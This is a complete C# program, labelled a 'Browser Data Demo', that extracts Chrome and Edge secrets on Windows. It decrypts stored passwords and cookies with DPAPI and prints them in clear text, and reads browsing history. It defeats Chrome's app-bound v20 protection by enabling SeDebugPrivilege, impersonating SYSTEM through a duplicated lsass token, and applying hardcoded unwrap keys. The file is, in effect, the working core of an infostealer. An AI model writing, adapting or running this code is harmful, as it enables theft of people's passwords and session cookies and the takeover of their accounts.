using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using Microsoft.Data.Sqlite;

Console.OutputEncoding = Encoding.UTF8;
Console.WriteLine("=== Browser Data Demo (v10 + v20) ===\n");
Console.WriteLine($"Running as admin: {IsAdmin()}\n");

var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

foreach (var (browserName, relPath) in new[] {
    ("Chrome", @"Google\Chrome\User Data"),
    ("Edge",   @"Microsoft\Edge\User Data"),
})
{
    Console.WriteLine($"--- {browserName} ---");
    var userDataDir = Path.Combine(localAppData, relPath);
    if (!Directory.Exists(userDataDir)) { Console.WriteLine("  Not installed.\n"); continue; }

    var lsPath = Path.Combine(userDataDir, "Local State");
    if (!File.Exists(lsPath)) { Console.WriteLine("  No Local State.\n"); continue; }

    var json = File.ReadAllText(lsPath);
    using var doc = JsonDocument.Parse(json);
    var osCrypt = doc.RootElement.GetProperty("os_crypt");

    // ── v10 key (standard DPAPI) ──
    byte[]? v10Key = null;
    if (osCrypt.TryGetProperty("encrypted_key", out var ek))
    {
        var raw = Convert.FromBase64String(ek.GetString()!);
        v10Key = DpapiUnprotect(raw[5..]);
        Console.WriteLine($"  v10 key: {(v10Key != null ? "OK" : "FAIL")}");
    }

    // ── v20 key (app-bound, requires admin) ──
    byte[]? v20Key = null;
    if (osCrypt.TryGetProperty("app_bound_encrypted_key", out var ak))
    {
        var b64 = ak.GetString()!;
        Console.WriteLine($"  app_bound key present, attempting v20 extraction...");
        try { v20Key = GetAppBoundMasterKey(b64); }
        catch (Exception ex) { Console.WriteLine($"  v20 key FAIL: {ex.Message}"); }

        Console.WriteLine($"  v20 key: {(v20Key != null ? "OK" : "FAIL")}");
    }

    // ── Read Passwords ──
    var loginPath = Path.Combine(userDataDir, "Default", "Login Data");
    if (File.Exists(loginPath))
    {
        Console.WriteLine("\n  --- Passwords ---");
        var tmp = CopyToTemp(loginPath);
        if (tmp != null)
        {
            try
            {
                using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
                using var r = cmd.ExecuteReader();
                int v10c = 0, v20c = 0, ok = 0;
                while (r.Read())
                {
                    var url = r.GetString(0);
                    var user = r.GetString(1);
                    var enc = (byte[])r[2];
                    if (enc.Length < 3) continue;

                    string ver = enc[0] == (byte)'v' && enc[2] == (byte)'0'
                        ? (enc[1] == (byte)'1' ? "v10" : enc[1] == (byte)'2' ? "v20" : "?")
                        : "legacy";

                    if (ver == "v10") v10c++; else if (ver == "v20") v20c++;

                    string? pass = null;
                    try
                    {
                        var key = ver == "v20" ? v20Key : v10Key;
                        if (key != null)
                            pass = DecryptAesGcm(enc, key, isCookie: false);
                    }
                    catch { }

                    if (pass != null) ok++;
                    if (pass != null)
                        Console.WriteLine($"    [{ver}] {Trunc(url,35)} | {user} | {pass}");
                }
                Console.WriteLine($"  => {v10c} v10, {v20c} v20, {ok} decrypted");
            }
            catch (Exception ex) { Console.WriteLine($"  ERR: {ex.Message}"); }
            finally { try { File.Delete(tmp); } catch { } }
        }
    }

    // ── Read Cookies ──
    var cookiePath = Path.Combine(userDataDir, "Default", "Network", "Cookies");
    if (!File.Exists(cookiePath)) cookiePath = Path.Combine(userDataDir, "Default", "Cookies");
    if (File.Exists(cookiePath))
    {
        Console.WriteLine("\n  --- Cookies ---");
        var tmp = CopyToTemp(cookiePath);
        if (tmp != null)
        {
            try
            {
                using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT host_key, name, encrypted_value FROM cookies LIMIT 5";
                using var r = cmd.ExecuteReader();
                int ok = 0;
                while (r.Read())
                {
                    var host = r.GetString(0);
                    var cname = r.GetString(1);
                    var enc = (byte[])r[2];
                    if (enc.Length < 3) continue;

                    string ver = enc[0] == (byte)'v' && enc[2] == (byte)'0'
                        ? (enc[1] == (byte)'1' ? "v10" : enc[1] == (byte)'2' ? "v20" : "?")
                        : "legacy";

                    string? val = null;
                    try
                    {
                        var key = ver == "v20" ? v20Key : v10Key;
                        if (key != null)
                        {
                            val = DecryptAesGcm(enc, key, isCookie: true);
                            ok++;
                        }
                    }
                    catch { }

                    Console.WriteLine($"    [{ver}] {Trunc(host,30)} | {cname}={(val != null ? Trunc(val,20) : "?")}");
                }
                Console.WriteLine($"  => {ok} decrypted");
            }
            catch (Exception ex) { Console.WriteLine($"  ERR: {ex.Message}"); }
            finally { try { File.Delete(tmp); } catch { } }
        }
    }

    // ── History ──
    var histPath = Path.Combine(userDataDir, "Default", "History");
    if (File.Exists(histPath))
    {
        Console.WriteLine("\n  --- History ---");
        var tmp = CopyToTemp(histPath);
        if (tmp != null)
        {
            try
            {
                using var conn = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
                conn.Open();
                using var cmd = conn.CreateCommand();
                cmd.CommandText = "SELECT url, title, visit_count FROM urls ORDER BY last_visit_time DESC LIMIT 5";
                using var r = cmd.ExecuteReader();
                while (r.Read())
                    Console.WriteLine($"    {Trunc(r.GetString(0),50)} | visits={r.GetInt32(2)}");
            }
            catch (Exception ex) { Console.WriteLine($"  ERR: {ex.Message}"); }
            finally { try { File.Delete(tmp); } catch { } }
        }
    }

    Console.WriteLine();
}

Console.WriteLine("Done. Press Enter.");
Console.ReadLine();

// ═══════════════════════════════════════════════════════════════════════════
//  Helpers
// ═══════════════════════════════════════════════════════════════════════════

static string? CopyToTemp(string path)
{
    var tmp = Path.Combine(Path.GetTempPath(), $"bd_{Guid.NewGuid():N}.db");
    try
    {
        using var src = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
        using var dst = new FileStream(tmp, FileMode.Create, FileAccess.Write);
        src.CopyTo(dst);
        // Copy WAL/SHM
        foreach (var ext in new[] { "-wal", "-shm" })
            try { if (File.Exists(path + ext)) File.Copy(path + ext, tmp + ext, true); } catch { }
        return tmp;
    }
    catch { try { File.Delete(tmp); } catch { } return null; }
}

static string DecryptAesGcm(byte[] encrypted, byte[] key, bool isCookie)
{
    var nonce = encrypted[3..15];
    var tagStart = encrypted.Length - 16;
    var ciphertext = encrypted[15..tagStart];
    var tag = encrypted[tagStart..];
    var plaintext = new byte[ciphertext.Length];
    using var aes = new AesGcm(key, 16);
    aes.Decrypt(nonce, ciphertext, tag, plaintext);
    // v20 cookies skip first 32 bytes
    if (isCookie && plaintext.Length > 32)
        return Encoding.UTF8.GetString(plaintext, 32, plaintext.Length - 32);
    return Encoding.UTF8.GetString(plaintext);
}

static bool IsAdmin() => System.Security.Principal.WindowsIdentity.GetCurrent().Owner
    ?.IsWellKnown(System.Security.Principal.WellKnownSidType.BuiltinAdministratorsSid) ?? false;

// ═══════════════════════════════════════════════════════════════════════════
//  DPAPI
// ═══════════════════════════════════════════════════════════════════════════

static byte[]? DpapiUnprotect(byte[] data)
{
    var blob = new DATA_BLOB { cbData = data.Length, pbData = Marshal.AllocHGlobal(data.Length) };
    Marshal.Copy(data, 0, blob.pbData, data.Length);
    try
    {
        if (CryptUnprotectData(ref blob, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, out var o))
        {
            var r = new byte[o.cbData];
            Marshal.Copy(o.pbData, r, 0, o.cbData);
            LocalFree(o.pbData);
            return r;
        }
        return null;
    }
    finally { Marshal.FreeHGlobal(blob.pbData); }
}

// ═══════════════════════════════════════════════════════════════════════════
//  App-Bound v20 Decryption (requires admin + SeDebugPrivilege)
// ═══════════════════════════════════════════════════════════════════════════

static byte[]? GetAppBoundMasterKey(string base64)
{
    var raw = Convert.FromBase64String(base64);
    if (raw.Length < 5 || Encoding.ASCII.GetString(raw, 0, 4) != "APPB") { Console.WriteLine("    [v20] bad APPB prefix"); return null; }
    var encData = raw[4..];
    Console.WriteLine($"    [v20] after strip APPB: {encData.Length} bytes");

    var sysDec = DpapiDecryptAsSystem(encData);
    if (sysDec == null) { Console.WriteLine("    [v20] SYSTEM DPAPI null"); return null; }
    Console.WriteLine($"    [v20] sysDec: {sysDec.Length} bytes");

    var userDec = DpapiUnprotect(sysDec);
    if (userDec == null) { Console.WriteLine("    [v20] user DPAPI null"); return null; }
    Console.WriteLine($"    [v20] userDec: {userDec.Length} bytes");

    var key = ParseKeyBlob(userDec);
    Console.WriteLine($"    [v20] final key: {(key != null ? $"OK {key.Length}B" : "FAIL")}");
    return key;
}

static byte[]? DpapiDecryptAsSystem(byte[] data)
{
    IntPtr lsassToken = IntPtr.Zero;
    try
    {
        var procs = System.Diagnostics.Process.GetProcessesByName("lsass");
        if (procs.Length == 0) { Console.WriteLine("    [v20] no lsass process"); return null; }
        var pid = procs[0].Id;
        foreach (var p in procs) p.Dispose();
        Console.WriteLine($"    [v20] lsass PID={pid}");

        EnableDebugPrivilege();

        var hProc = OpenProcess(0x1000, false, (uint)pid); // PROCESS_QUERY_LIMITED_INFORMATION – no SeDebugPrivilege needed
        if (hProc == IntPtr.Zero) { Console.WriteLine($"    [v20] OpenProcess failed: 0x{Marshal.GetLastWin32Error():X8}"); return null; }
        Console.WriteLine("    [v20] OpenProcess OK");

        try
        {
            if (!OpenProcessToken(hProc, 0x0002 | 0x0008, out var hToken)) // TOKEN_DUPLICATE | TOKEN_QUERY
            { Console.WriteLine($"    [v20] OpenProcessToken failed: 0x{Marshal.GetLastWin32Error():X8}"); return null; }
            Console.WriteLine("    [v20] OpenProcessToken OK");
            try
            {
                if (!DuplicateTokenEx(hToken, 0x000F01FF, IntPtr.Zero, 2, 1, out lsassToken))
                { Console.WriteLine($"    [v20] DuplicateTokenEx failed: 0x{Marshal.GetLastWin32Error():X8}"); return null; }
                Console.WriteLine("    [v20] DuplicateTokenEx OK");
            }
            finally { CloseHandle(hToken); }
        }
        finally { CloseHandle(hProc); }

        if (!ImpersonateLoggedOnUser(lsassToken))
        { Console.WriteLine($"    [v20] ImpersonateLoggedOnUser failed: 0x{Marshal.GetLastWin32Error():X8}"); return null; }
        Console.WriteLine("    [v20] SYSTEM impersonation OK, calling DPAPI...");
        try
        {
            var result = DpapiUnprotect(data);
            Console.WriteLine($"    [v20] SYSTEM DPAPI: {(result != null ? "OK" : "FAIL")}");
            return result;
        }
        finally { RevertToSelf(); }
    }
    catch (Exception ex) { Console.WriteLine($"    [v20] exception: {ex.Message}"); return null; }
    finally { if (lsassToken != IntPtr.Zero) CloseHandle(lsassToken); }
}

static byte[]? ParseKeyBlob(byte[] blob)
{
    Console.WriteLine($"    [v20] blob: {blob.Length} bytes");
    if (blob.Length < 8) { Console.WriteLine("    [v20] blob too short"); return null; }
    int hdrLen = BitConverter.ToInt32(blob, 0);
    int off = 4 + hdrLen;
    if (off + 4 > blob.Length) { Console.WriteLine($"    [v20] hdrLen={hdrLen}, off+4 > len"); return null; }
    int contentLen = BitConverter.ToInt32(blob, off);
    int dataStart = off + 4;
    if (dataStart + contentLen > blob.Length) { Console.WriteLine($"    [v20] contentLen={contentLen}, overflow"); return null; }
    Console.WriteLine($"    [v20] hdrLen={hdrLen}, contentLen={contentLen}");

    var c = blob[dataStart..(dataStart + contentLen)];

    // Edge/app-bound: contentLen==32 means it's already the raw AES-256 key
    if (c.Length == 32) { Console.WriteLine("    [v20] raw key (32 bytes)"); return c; }

    Console.WriteLine($"    [v20] content: {c.Length} bytes (flag+IV(12)+ct+tag(16) expected)");
    if (c.Length < 61) { Console.WriteLine($"    [v20] content too short: {c.Length}"); return null; }

    byte flag = c[0];
    var iv = c[1..13];
    var ciphertext = c[13..^16];
    var tag = c[^16..];
    Console.WriteLine($"    [v20] flag={flag}, ctLen={ciphertext.Length}");

    if (flag == 1) return AesGcmDecryptFlag1(iv, ciphertext, tag);
    if (flag == 2) return ChaCha20Decrypt(iv, ciphertext, tag);
    Console.WriteLine($"    [v20] unhandled flag: {flag} (needs CNG, skipping)");
    return null;
}

static byte[]? AesGcmDecryptFlag1(byte[] iv, byte[] ciphertext, byte[] tag)
{
    byte[] key = [0xB3,0x1C,0x6E,0x24,0x1A,0xC8,0x46,0x72,0x8D,0xA9,0xC1,0xFA,0xC4,0x93,0x66,0x51,0xCF,0xFB,0x94,0x4D,0x14,0x3A,0xB8,0x16,0x27,0x6B,0xCC,0x6D,0xA0,0x28,0x47,0x87];
    var pt = new byte[ciphertext.Length];
    using var aes = new AesGcm(key, 16);
    aes.Decrypt(iv, ciphertext, tag, pt);
    return pt;
}

static byte[]? ChaCha20Decrypt(byte[] iv, byte[] ciphertext, byte[] tag)
{
    var chaChaKey = new byte[] {
        0xE9,0x8F,0x37,0xD7,0xF4,0xE1,0xFA,0x43,0x3D,0x19,0x30,0x4D,0xC2,0x25,0x80,0x42,
        0x09,0x0E,0x2D,0x1D,0x7E,0xEA,0x76,0x70,0xD4,0x1F,0x73,0x8D,0x08,0x72,0x96,0x60
    };
    var pt = new byte[ciphertext.Length];
    using var chacha = new ChaCha20Poly1305(chaChaKey);
    chacha.Decrypt(iv, ciphertext, tag, pt);
    return pt;
}

static void EnableDebugPrivilege()
{
    if (!OpenProcessToken(GetCurrentProcess(), 0x0020 | 0x0008, out var hToken))
    { Console.WriteLine($"    [v20] OpenProcessToken(self) failed: 0x{Marshal.GetLastWin32Error():X8}"); return; }
    try
    {
        if (!LookupPrivilegeValue(null, "SeDebugPrivilege", out var luid))
        { Console.WriteLine($"    [v20] LookupPrivilegeValue failed: 0x{Marshal.GetLastWin32Error():X8}"); return; }
        var tp = new TOKEN_PRIVILEGES { Count = 1, Luid = luid, Attr = 0x00000002 }; // SE_PRIVILEGE_ENABLED
        AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
        Console.WriteLine($"    [v20] SeDebugPrivilege enabled (err=0x{Marshal.GetLastWin32Error():X8})");
    }
    finally { CloseHandle(hToken); }
}

static string Trunc(string s, int n) => s.Length <= n ? s : s[..n] + "...";

// ═══════ Type declarations (must be after all top-level statements) ═══════
[DllImport("crypt32.dll", SetLastError = true)]
static extern bool CryptUnprotectData(ref DATA_BLOB pDataIn, IntPtr a, IntPtr b, IntPtr c, IntPtr d, int f, out DATA_BLOB pDataOut);
[DllImport("kernel32.dll")]
static extern IntPtr LocalFree(IntPtr hMem);
[DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr OpenProcess(uint a, bool b, uint c);
[DllImport("kernel32.dll", SetLastError = true)] static extern bool CloseHandle(IntPtr h);
[DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
[DllImport("advapi32.dll", SetLastError = true)] static extern bool OpenProcessToken(IntPtr h, uint a, out IntPtr t);
[DllImport("advapi32.dll", SetLastError = true)] static extern bool DuplicateTokenEx(IntPtr h, uint a, IntPtr b, int i, int t, out IntPtr n);
[DllImport("advapi32.dll", SetLastError = true)] static extern bool ImpersonateLoggedOnUser(IntPtr h);
[DllImport("advapi32.dll", SetLastError = true)] static extern bool RevertToSelf();
[DllImport("advapi32.dll", SetLastError = true)] static extern bool LookupPrivilegeValue(string? s, string n, out long l);
[DllImport("advapi32.dll", SetLastError = true)] static extern bool AdjustTokenPrivileges(IntPtr h, bool d, ref TOKEN_PRIVILEGES n, int b, IntPtr p, IntPtr r);

[StructLayout(LayoutKind.Sequential)]
struct DATA_BLOB { public int cbData; public IntPtr pbData; }

struct TOKEN_PRIVILEGES { public uint Count; public long Luid; public uint Attr; }